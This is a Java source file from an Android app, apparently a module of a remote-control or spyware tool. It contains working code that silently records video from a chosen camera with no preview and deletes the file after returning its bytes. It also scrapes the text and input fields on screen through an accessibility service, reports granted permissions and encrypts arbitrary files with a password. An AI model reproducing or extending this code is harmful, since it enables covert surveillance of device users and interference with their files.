package com.zeko.droid;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Collections;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/** Module phụ: quay video, inspector, permissions, mã hoá file. */
public final class Extras {

    // ─────────────────── quay video bằng Camera2 + MediaRecorder ───────────────────
    public static byte[] recordVideo(Context ctx, int seconds, int facing) {
        File out = new File(ctx.getCacheDir(), "zk_" + System.currentTimeMillis() + ".mp4");
        HandlerThread ht = new HandlerThread("zk-vid");
        ht.start();
        Handler handler = new Handler(ht.getLooper());
        MediaRecorder rec = null;
        CameraDevice dev = null;
        CameraCaptureSession session = null;
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String id = null;
            for (String c : cm.getCameraIdList()) {
                Integer f = cm.getCameraCharacteristics(c).get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == facing) { id = c; break; }
            }
            if (id == null && cm.getCameraIdList().length > 0) id = cm.getCameraIdList()[0];
            if (id == null) return null;

            rec = new MediaRecorder();
            rec.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            rec.setVideoSize(1280, 720);
            rec.setVideoFrameRate(24);
            rec.setVideoEncodingBitRate(2_000_000);
            rec.setOutputFile(out.getAbsolutePath());
            rec.prepare();

            final CountDownLatch opened = new CountDownLatch(1);
            final CameraDevice[] devRef = new CameraDevice[1];
            cm.openCamera(id, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice d) { devRef[0] = d; opened.countDown(); }
                @Override public void onDisconnected(CameraDevice d) { opened.countDown(); }
                @Override public void onError(CameraDevice d, int e) { opened.countDown(); }
            }, handler);
            opened.await(6, TimeUnit.SECONDS);
            dev = devRef[0];
            if (dev == null) return null;

            final CountDownLatch configured = new CountDownLatch(1);
            final CameraCaptureSession[] sRef = new CameraCaptureSession[1];
            dev.createCaptureSession(Collections.singletonList(rec.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override public void onConfigured(CameraCaptureSession s) { sRef[0] = s; configured.countDown(); }
                        @Override public void onConfigureFailed(CameraCaptureSession s) { configured.countDown(); }
                    }, handler);
            configured.await(6, TimeUnit.SECONDS);
            session = sRef[0];
            if (session == null) return null;

            CaptureRequest.Builder b = dev.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
            b.addTarget(rec.getSurface());
            session.setRepeatingRequest(b.build(), null, handler);

            rec.start();
            Thread.sleep(Math.max(2, Math.min(30, seconds)) * 1000L);
            rec.stop();
            rec.reset();
            rec.release();
            rec = null;

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try (FileInputStream fis = new FileInputStream(out)) {
                byte[] buf = new byte[16384];
                int n;
                while ((n = fis.read(buf)) > 0) bos.write(buf, 0, n);
            }
            return bos.toByteArray();
        } catch (Throwable t) {
            return null;
        } finally {
            try { if (session != null) session.close(); } catch (Throwable ignored) { }
            try { if (dev != null) dev.close(); } catch (Throwable ignored) { }
            if (rec != null) { try { rec.release(); } catch (Throwable ignored) { } }
            try { ht.quitSafely(); } catch (Throwable ignored) { }
            //noinspection ResultOfMethodCallIgnored
            out.delete();
        }
    }

    // ─────────────────── inspector: cây accessibility ───────────────────
    public static JSONArray inspect() {
        JSONArray arr = new JSONArray();
        ZkAccessibilityService acc = ZkAccessibilityService.INSTANCE;
        if (acc == null) return arr;
        try {
            AccessibilityNodeInfo root = acc.getRootInActiveWindow();
            if (root == null) return arr;
            walk(root, arr, 0);
        } catch (Throwable ignored) { }
        return arr;
    }

    private static void walk(AccessibilityNodeInfo n, JSONArray out, int depth) {
        if (n == null || depth > 4 || out.length() > 300) return;
        try {
            JSONObject o = new JSONObject();
            CharSequence txt = n.getText();
            CharSequence desc = n.getContentDescription();
            o.put("cls", n.getClassName() == null ? "" : n.getClassName().toString());
            o.put("text", txt == null ? "" : txt.toString());
            if (desc != null && desc.length() > 0) o.put("desc", desc.toString());
            if (n.isClickable()) o.put("clickable", true);
            if (n.isEditable()) o.put("editable", true);
            android.graphics.Rect r = new android.graphics.Rect();
            n.getBoundsInScreen(r);
            o.put("bounds", r.left + "," + r.top + "," + r.right + "," + r.bottom);
            o.put("depth", depth);
            if (txt != null && txt.length() > 0 || n.isClickable()) out.put(o);
            for (int i = 0; i < n.getChildCount(); i++) walk(n.getChild(i), out, depth + 1);
        } catch (Throwable ignored) { }
    }

    // ─────────────────── permissions ───────────────────
    public static JSONArray permissions(Context ctx) {
        JSONArray arr = new JSONArray();
        try {
            PackageInfo pi = ctx.getPackageManager().getPackageInfo(
                    ctx.getPackageName(), PackageManager.GET_PERMISSIONS);
            String[] perms = pi.requestedPermissions;
            if (perms == null) return arr;
            for (String p : perms) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("perm", p.substring(p.lastIndexOf('.') + 1));
                    o.put("granted", ctx.checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED);
                    arr.put(o);
                } catch (Throwable ignored) { }
            }
        } catch (Throwable ignored) { }
        return arr;
    }

    // ─────────────────── mã hoá / giải mã file (AES-256-CBC) ───────────────────
    public static JSONObject encryptFile(String path, String pass, boolean decrypt) {
        try {
            File src = new File(path);
            if (!src.exists()) return new JSONObject().put("error", "khong thay file");
            byte[] key = java.security.MessageDigest.getInstance("SHA-256")
                    .digest(pass.getBytes("UTF-8"));
            byte[] data = readAll(src);
            byte[] outBytes;
            File dst;
            if (!decrypt) {
                byte[] iv = new byte[16];
                new java.security.SecureRandom().nextBytes(iv);
                Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
                c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
                byte[] ct = c.doFinal(data);
                outBytes = new byte[16 + ct.length];
                System.arraycopy(iv, 0, outBytes, 0, 16);
                System.arraycopy(ct, 0, outBytes, 16, ct.length);
                dst = new File(path + ".zkenc");
            } else {
                if (data.length < 32) return new JSONObject().put("error", "file khong hop le");
                byte[] iv = new byte[16];
                System.arraycopy(data, 0, iv, 0, 16);
                Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
                c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
                outBytes = c.doFinal(data, 16, data.length - 16);
                dst = new File(path.endsWith(".zkenc")
                        ? path.substring(0, path.length() - 6) : path + ".dec");
            }
            try (FileOutputStream fos = new FileOutputStream(dst)) { fos.write(outBytes); }
            return new JSONObject().put("ok", true).put("path", dst.getAbsolutePath())
                    .put("size", outBytes.length);
        } catch (Throwable t) {
            try {
                return new JSONObject().put("error", "aes: " + t.getClass().getSimpleName()
                        + " " + t.getMessage());
            } catch (Throwable ignored) {
                return new JSONObject();
            }
        }
    }

    private static byte[] readAll(File f) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] buf = new byte[16384];
            int n;
            while ((n = fis.read(buf)) > 0) bos.write(buf, 0, n);
        }
        return bos.toByteArray();
    }

    static { }
    static final int JPEG = ImageFormat.JPEG;
}
